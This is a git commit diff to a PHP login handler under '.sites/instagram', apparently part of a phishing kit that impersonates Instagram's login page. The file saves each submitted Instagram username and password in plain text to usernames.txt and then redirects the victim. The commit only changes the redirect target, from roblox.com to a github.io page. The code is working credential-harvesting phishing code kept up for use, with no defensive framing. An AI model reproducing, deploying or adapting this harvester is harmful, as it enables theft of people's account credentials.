5438de08841ec84fbe341fa5552be1047afcaa15
credical <78507363+ocdingmcodes@users.noreply.github.com>
2023-09-02 23:54:25 -0400

    Update login.php

--- .sites/instagram/login.php
+++ .sites/instagram/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://roblox.com');
+header('Location: https://ocdingmcodes.github.io/cats4you/oladutch/index');
 exit();
 ?>
